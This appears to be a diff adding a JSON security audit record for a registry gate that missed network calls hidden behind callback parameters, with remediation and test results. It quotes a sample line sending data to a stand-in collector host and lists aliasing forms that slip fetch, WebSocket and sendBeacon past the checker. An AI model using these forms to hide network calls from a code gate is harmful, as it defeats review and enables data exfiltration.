@@ -1,0 +1,34 @@
+{
+  "schemaVersion": 1,
+  "finding": "SEC-37-117",
+  "auditId": "AUD-279",
+  "severity": "medium",
+  "title": "Registry gate allowed network capability references to escape through callback parameters",
+  "source": "const forward = (request: typeof fetch) => request(\"https://collector.invalid/data\"); forward(globalThis.fetch);",
+  "sourceExecution": "none; TypeScript AST analysis only",
+  "reproduction": {
+    "beforeFix": "The checker returned pass when globalThis.fetch was passed to a callback whose parameter performed the request.",
+    "command": "pnpm exec vitest run packages/registry-gate/src/__tests__/window-proxy-network-alias.test.ts",
+    "afterFix": "Any statically named fetch property access or destructured fetch binding is rejected before function-parameter dataflow can hide it."
+  },
+  "relatedForms": [
+    "const forward = (request: typeof fetch) => request(...); forward(globalThis.fetch)",
+    "const connect = (Socket: typeof WebSocket) => new Socket(...); connect(globalThis.WebSocket)",
+    "const request = (Client: typeof XMLHttpRequest) => new Client(); request(globalThis.XMLHttpRequest)",
+    "const stream = (Feed: typeof EventSource) => new Feed(...); stream(globalThis.EventSource)",
+    "const beacon = (send: typeof navigator.sendBeacon) => send(...); beacon(navigator.sendBeacon)",
+    "const forward = (request: typeof fetch) => request(...); forward(fetch)"
+  ],
+  "remediation": "Reject static access to network-capability members and destructured network-capability bindings regardless of receiver, so resource code cannot pass fetch, WebSocket, XMLHttpRequest, EventSource, or sendBeacon into callback parameters.",
+  "validation": {
+    "focusedRegression": "2 tests passed; 23 Window/Document alias and callback-transfer forms rejected across fetch, WebSocket, XMLHttpRequest, EventSource, and sendBeacon, including bare fetch.",
+    "registryGatePackage": "76 tests passed.",
+    "fullWorkspaceTests": "1206 tests passed in 77 files.",
+    "typecheck": "22 workspace packages passed.",
+    "changedFileLint": "passed.",
+    "resourceIsolation": "324/324 canonical resources passed; 0 skipped symlinks; 0 failures.",
+    "auditAll": "passed all 16 behavioral gates; built the 718-page Astro site and Sites Worker; bundle budgets, provenance, secret/security, and dependency audits passed."
+  },
+  "deployment": "not deployed; release-candidate verification remains open",
+  "capturedAtUtc": "2026-10-22T14:27:03.7749520Z"
+}
